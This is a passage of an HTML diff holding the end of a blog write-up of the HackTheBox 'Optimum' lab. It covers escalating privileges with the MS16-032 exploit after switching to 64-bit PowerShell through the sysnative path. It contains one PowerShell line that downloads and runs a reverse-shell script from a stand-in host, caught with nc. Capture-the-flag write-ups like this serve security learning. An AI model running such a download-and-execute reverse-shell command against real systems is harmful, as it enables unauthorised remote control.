+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/download-ms16032-wget.png"
+            data-srcset="/posts/htb/optimum/download-ms16032-wget.png, /posts/htb/optimum/download-ms16032-wget.png 1.5x, /posts/htb/optimum/download-ms16032-wget.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/download-ms16032-wget.png" width="1888" height="427" />
+    </a><figcaption class="image-caption">download the exploit</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/edit-the-exploit-file-ms16032.png" title="exploit example" data-thumbnail="/posts/htb/optimum/edit-the-exploit-file-ms16032.png" data-sub-html="<h2>exploit example</h2><p>exploit example</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/edit-the-exploit-file-ms16032.png"
+            data-srcset="/posts/htb/optimum/edit-the-exploit-file-ms16032.png, /posts/htb/optimum/edit-the-exploit-file-ms16032.png 1.5x, /posts/htb/optimum/edit-the-exploit-file-ms16032.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/edit-the-exploit-file-ms16032.png" width="1241" height="837" />
+    </a><figcaption class="image-caption">exploit example</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/put-at-the-last-line.png" title="edit the exploit" data-thumbnail="/posts/htb/optimum/put-at-the-last-line.png" data-sub-html="<h2>edit the exploit</h2><p>edit the exploit</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/put-at-the-last-line.png"
+            data-srcset="/posts/htb/optimum/put-at-the-last-line.png, /posts/htb/optimum/put-at-the-last-line.png 1.5x, /posts/htb/optimum/put-at-the-last-line.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/put-at-the-last-line.png" width="1209" height="515" />
+    </a><figcaption class="image-caption">edit the exploit</figcaption>
+    </figure></p>
+<h3 id="windows-sysnative">Windows: sysnative</h3>
+<p>I tried a bunch of times to run this exploit but the result is nothing. This machine is <code>64</code> bit and also the exploit is tested on a <code>64</code> bit <code>2k12R2</code> server. Now, I&rsquo;m dumbfounded. Then, I realize maybe the powershell itself running on another architecture. So, I <a href="https://stackoverflow.com/questions/8588960/determine-if-current-powershell-process-is-32-bit-or-64-bit/8589649#8589649" target="_blank" rel="noopener noreffer ">check</a>, and it&rsquo;s confirmed. The powershell is running on <code>32</code> bit.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/example-tested-exploit.png" title="exploit compatibility" data-thumbnail="/posts/htb/optimum/example-tested-exploit.png" data-sub-html="<h2>exploit compatibility</h2><p>exploit compatibility</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/example-tested-exploit.png"
+            data-srcset="/posts/htb/optimum/example-tested-exploit.png, /posts/htb/optimum/example-tested-exploit.png 1.5x, /posts/htb/optimum/example-tested-exploit.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/example-tested-exploit.png" width="503" height="161" />
+    </a><figcaption class="image-caption">exploit compatibility</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/check-the-arc-of-powershell-32-bit.png" title="check powershell architecture" data-thumbnail="/posts/htb/optimum/check-the-arc-of-powershell-32-bit.png" data-sub-html="<h2>check powershell architecture</h2><p>check powershell architecture</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/check-the-arc-of-powershell-32-bit.png"
+            data-srcset="/posts/htb/optimum/check-the-arc-of-powershell-32-bit.png, /posts/htb/optimum/check-the-arc-of-powershell-32-bit.png 1.5x, /posts/htb/optimum/check-the-arc-of-powershell-32-bit.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/check-the-arc-of-powershell-32-bit.png" width="516" height="185" />
+    </a><figcaption class="image-caption">check powershell architecture</figcaption>
+    </figure></p>
+<p>With quick googling, I found this <a href="https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe/19056011#19056011" target="_blank" rel="noopener noreffer ">answer</a> on <a href="https://stackoverflow.com/" target="_blank" rel="noopener noreffer ">stackoverflow</a>. I need to run the powershell in the <code>sysnative</code> directory to get the <code>64</code> bit version. Well, I need to restart over again. So, back again to the burpsuite and put this as the payload. Then, catch the shell with <code>nc</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">sysnative</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="mf">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://example.com/Invoke-PowerShellTcp.ps1&#39;)&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When I checked the powershell architecture indeed it is running on 	<code>64</code> bit. YES!!!</p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/check-the-arc-of-powershell-64-bit.png" title="using 64bit powershell" data-thumbnail="/posts/htb/optimum/check-the-arc-of-powershell-64-bit.png" data-sub-html="<h2>using 64bit powershell</h2><p>using 64bit powershell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/check-the-arc-of-powershell-64-bit.png"
+            data-srcset="/posts/htb/optimum/check-the-arc-of-powershell-64-bit.png, /posts/htb/optimum/check-the-arc-of-powershell-64-bit.png 1.5x, /posts/htb/optimum/check-the-arc-of-powershell-64-bit.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/check-the-arc-of-powershell-64-bit.png" width="673" height="273" />
+    </a><figcaption class="image-caption">using 64bit powershell</figcaption>
+    </figure></p>
+<h2 id="windows-privilege-escalation">Windows: Privilege Escalation</h2>
+<p>Now, I&rsquo;m executing the <a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blank" rel="noopener noreffer ">privesc exploit</a> once again. My python server shows the request from the file called <code>Invoke-MS16032.ps1</code> followed with <code>yeet.ps1</code> and finally, I&rsquo;ve got a shell as <code>system</code>.</p>
+<p><figure><a class="lightgallery" href="/posts/htb/optimum/last-image.png" title="shell as nt authority\system" data-thumbnail="/posts/htb/optimum/last-image.png" data-sub-html="<h2>shell as nt authority\system</h2><p>shell as nt authority\system</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/optimum/last-image.png"
+            data-srcset="/posts/htb/optimum/last-image.png, /posts/htb/optimum/last-image.png 1.5x, /posts/htb/optimum/last-image.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/optimum/last-image.png" width="1895" height="836" />
+    </a><figcaption class="image-caption">shell as nt authority\system</figcaption>
+    </figure></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 17-06-2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://shafiqaiman.com/posts/htb/optimum/" data-title="HackTheBox - Optimum Writeup" data-via="_shafiqaiman_" data-hashtags="CVE-2014-6287,CVE-2016-0099,MS16-032,rce,reverse-powershell,httpfileserver,HFS,empire-project,windows-sysnative,powershell-arc"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://shafiqaiman.com/posts/htb/optimum/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://shafiqaiman.com/posts/htb/optimum/" data-title="HackTheBox - Optimum Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://shafiqaiman.com/posts/htb/optimum/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/cve-2014-6287/">CVE-2014-6287</a>,&nbsp;<a href="/tags/cve-2016-0099/">CVE-2016-0099</a>,&nbsp;<a href="/tags/ms16-032/">MS16-032</a>,&nbsp;<a href="/tags/rce/">rce</a>,&nbsp;<a href="/tags/reverse-powershell/">reverse-powershell</a>,&nbsp;<a href="/tags/httpfileserver/">httpfileserver</a>,&nbsp;<a href="/tags/hfs/">HFS</a>,&nbsp;<a href="/tags/empire-project/">empire-project</a>,&nbsp;<a href="/tags/windows-sysnative/">windows-sysnative</a>,&nbsp;<a href="/tags/powershell-arc/">powershell-arc</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/htb/jerry/" class="prev" rel="prev" title="HackTheBox - Jerry Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Jerry Writeup</a>
+            <a href="/posts/htb/paper/" class="next" rel="next" title="HackTheBox - Paper Writeup">HackTheBox - Paper Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
